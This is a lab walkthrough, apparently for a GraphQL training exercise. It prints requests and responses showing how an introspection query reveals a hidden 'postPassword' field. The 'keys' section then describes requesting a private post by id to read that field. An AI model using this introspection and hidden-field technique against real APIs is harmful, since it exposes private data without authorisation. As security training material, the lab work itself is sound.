# **WSA-GraphQL-Lab1**

_An #ND-AF / #AuDHD Perspective on GraphQL Introspection & Hidden Data_  
`// Because sometimes the most interesting data is the data they don't think you'll ask for` 🔍🕶️

**AUTHORS:**

- **51n5337** - _The Arghmage_ 🧙‍♂️🔮 | Your nerd bro from the block, that ghost in the grid
    
- **#OG** - _The Unseen Sentinel_ 🏳️‍⚧️⚡ | Silent protocol analyst, pattern breaker, reality debugger
    
- **AFFILIATION:** [`>dr.kb< multiverse-lib`](https://bkornpob.github.io) 🌐📚 | **Where hyperfocus archives collide with reality**
    

**INCIDENT DATE:** [System Time: 2025-11-01]  
**CLASSIFICATION:** `GRAPHQL_FIELD_FORGERY` | `HIDDEN_DATA_EXFILTRATION`  
**VIBE CHECK:** `AUTISTIC_SQUIRREL_FINDING_THE_HIDDEN_NUT` 🐿️🔓

---

[...back](../note-1.md)

### key investigation

*keywords*
```
#q1
query, getBlogSummaries, getAllBlogPosts image, title, summary, id, operationName, getBlogSummaries
#r1
data, getAllBlogPosts, image, title, summary, id
---

#q2 
query, getBlogPost($id: Int!), getBlogPost(id: $id), image, title, author, date, paragraphs, operationName, getBlogPost, variables, id
#r2
data, getBlogPost, image, title, author, date, paragraphs 

#q3 
query, query, __schema, types, name, fields, name, description
#r3
data, __schema, types, name, BlogPost, fields, name:{id,image,title,author,date,summary,paragraphs,postPassword}, description:null, ...(more irrelevant)...
```

*query structure*
```
{
  "query":???,
  "operationName":{"getBlogSummaries", "getBlogPost"},
  "variables":??? # may be optional; used with getBlogPost
}
```

*keys*
> id=3 is missing from public view
> #q2 exposes more info than #q1
> #q3 reveals `postPassword` field
> use #q2, change two fields: `id`=3, any field name to `postPassword`
> read flag from `postPassword` field, and submit flag

---

### q1 GET /
#q1

```
#query POST /graphql/v1
{
  "query":"\nquery getBlogSummaries {\n    getAllBlogPosts {\n        image\n        title\n        summary\n        id\n    }\n}",
  "operationName":"getBlogSummaries"
}

---

#response
{
  "data": {
    "getAllBlogPosts": [
      {
        "image": "/image/blog/posts/56.jpg",
        "title": "Failing The High Five - And More",
        "summary": "I'm one of those awkward people who shouldn't spend so much time talking to strangers/acquaintances. Too friendly and far too jolly, that's me. So, when you go in for the high five, and it fails miserably, you don't half look...",
        "id": 4
      },
      {
        "image": "/image/blog/posts/61.jpg",
        "title": "Black Market Dealings",
        "summary": "A strange phenomenon has been occurring on a High school campus in Ohio. It seems one young boy was given several boxes of reusable coffee cups to use for promotional purposes. The boy was fairly lazy in the task and...",
        "id": 5
      },
      {
        "image": "/image/blog/posts/14.jpg",
        "title": "Making The Holidays Special Again",
        "summary": "This time of year I tend to mourn the loss of my little ones, all grown up with no surprises left to give them. Last year I found a way to combat this melancholy, and I thought I'd share what...",
        "id": 1
      },
      {
        "image": "/image/blog/posts/22.jpg",
        "title": "The Hearing Test",
        "summary": "A couple of months ago my flatmate went to have his hearing tested. We all thought he was just ignoring us, but as it turned out he was struggling to keep up with the conversations and decided better to be...",
        "id": 2
      }
    ]
  }
}
```

---

### q2 GET /post?postId=4
#q2

```
#query POST /graphql/v1
{
  "query":"\n    query getBlogPost($id: Int!) {\n        getBlogPost(id: $id) {\n            image\n            title\n            author\n            date\n            paragraphs\n        }\n    }",
  "operationName":"getBlogPost",
  "variables":{"id":4}
}

---

#response
{
  "data": {
    "getBlogPost": {
      "image": "/image/blog/posts/56.jpg",
      "title": "Failing The High Five - And More",
      "author": "Alan Key",
      "date": "2025-10-05T09:04:05.769Z",
      "paragraphs": [
        "I'm one of those awkward people who shouldn't spend so much time talking to strangers/acquaintances. Too friendly and far too jolly, that's me. So, when you go in for the high five, and it fails miserably, you don't half look an idiot. It's worse if you're chortling when you do it, then you're not sure what to do with your face, hands, voice, and every hair on your head.",
        "Laughing when you talk is a sure sign of awkwardness, or a self-awareness you really aren't very funny. So, you're trying to indicate what you're saying is funny, and the other person should laugh. Like the failed high five, there is the 'random-interrupting-when-they-weren't-speaking-to-you-throw-away-comment', where they may or may not be within easy earshot. This one is very embarrassing, especially if you are in company. As they drift past, oblivious to your sophisticated repartee, you're still making that fake laughing sound as you turn to your companion. Your companion is probably more embarrassed than you, they are tarred with the same brush by association. It all just feels a bit awkward.",
        "The trouble with listening to everyone else's conversations is, they don't often realize you are. When you butt in with, 'I'm Sorry but I couldn't help overhearing', they're so busy staring at you, and wondering who the nosey bod is, they will have lost the gist of pretty much everything you said. Again, you are left with what I like to call the 'after face', slightly crumpled, fading smile, with choking sounds.",
        "The moral of this story is. Gemma is a wally, don't be like Gemma."
      ]
    }
  }
}
```

---

### q3 __schema

to #OG #q3
```
id=3 is missing on the public view. i think it contains the secret.

i think we want to do query similar to #q2 + adding the secret-field-name.

first, help me with a query to see all available field names?
```

payload
```
{
  "query": "query { __schema { types { name fields { name description } } } }"
}
```

response
```
{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "BlogPost",
          "fields": [
            {
              "name": "id",
              "description": null
            },
            {
              "name": "image",
              "description": null
            },
            {
              "name": "title",
              "description": null
            },
            {
              "name": "author",
              "description": null
            },
            {
              "name": "date",
              "description": null
            },
            {
              "name": "summary",
              "description": null
            },
            {
              "name": "paragraphs",
              "description": null
            },
            {
              "name": "isPrivate",
              "description": null
            },
            {
              "name": "postPassword",
              "description": null
            }
          ]
        },
        {
          "name": "Boolean",
          "fields": null
        },
        {
          "name": "Int",
          "fields": null
        },
        {
          "name": "String",
          "fields": null
        },
        {
          "name": "Timestamp",
          "fields": null
        },
        {
          "name": "__Directive",
          "fields": [
            {
              "name": "name",
              "description": "The __Directive type represents a Directive that a server supports."
            },
            {
              "name": "description",
              "description": null
            },
            {
              "name": "isRepeatable",
              "description": null
            },
            {
              "name": "locations",
              "description": null
            },
            {
              "name": "args",
              "description": null
            }
          ]
        },
        {
          "name": "__DirectiveLocation",
          "fields": null
        },
        {
          "name": "__EnumValue",
          "fields": [
            {
              "name": "name",
              "description": null
            },
            {
              "name": "description",
              "description": null
            },
            {
              "name": "isDeprecated",
              "description": null
            },
            {
              "name": "deprecationReason",
              "description": null
            }
          ]
        },
        {
          "name": "__Field",
          "fields": [
            {
              "name": "name",
              "description": null
            },
            {
              "name": "description",
              "description": null
            },
            {
              "name": "args",
              "description": null
            },
            {
              "name": "type",
              "description": null
            },
            {
              "name": "isDeprecated",
              "description": null
            },
            {
              "name": "deprecationReason",
              "description": null
            }
          ]
        },
        {
          "name": "__InputValue",
          "fields": [
            {
              "name": "name",
              "description": null
            },
            {
              "name": "description",
              "description": null
            },
            {
              "name": "type",
              "description": null
            },
            {
              "name": "defaultValue",
              "description": null
            },
            {
              "name": "isDeprecated",
              "description": null
            },
            {
              "name": "deprecationReason",
              "description": null
            }
          ]
        },
        {
          "name": "__Schema",
          "fields": [
            {
              "name": "description",
              "description": null
            },
            {
              "name": "types",
              "description": "A list of all types supported by this server."
            },
            {
              "name": "queryType",
              "description": "The type that query operations will be rooted at."
            },
            {
              "name": "mutationType",
              "description": "If this server supports mutation, the type that mutation operations will be rooted at."
            },
            {
              "name": "directives",
              "description": "'A list of all directives supported by this server."
            },
            {
              "name": "subscriptionType",
              "description": "'If this server support subscription, the type that subscription operations will be rooted at."
            }
          ]
        },
        {
          "name": "__Type",
          "fields": [
            {
              "name": "kind",
              "description": null
            },
            {
              "name": "name",
              "description": null
            },
            {
              "name": "description",
              "description": null
            },
            {
              "name": "fields",
              "description": null
            },
            {
              "name": "interfaces",
              "description": null
            },
            {
              "name": "possibleTypes",
              "description": null
            },
            {
              "name": "enumValues",
              "description": null
            },
            {
              "name": "inputFields",
              "description": null
            },
            {
              "name": "ofType",
              "description": null
            },
            {
              "name": "specifiedByURL",
              "description": null
            }
          ]
        },
        {
          "name": "__TypeKind",
          "fields": null
        },
        {
          "name": "query",
          "fields": [
            {
              "name": "getBlogPost",
              "description": null
            },
            {
              "name": "getAllBlogPosts",
              "description": null
            }
          ]
        }
      ]
    }
  }
}
```

---

[...back](../note-1.md)
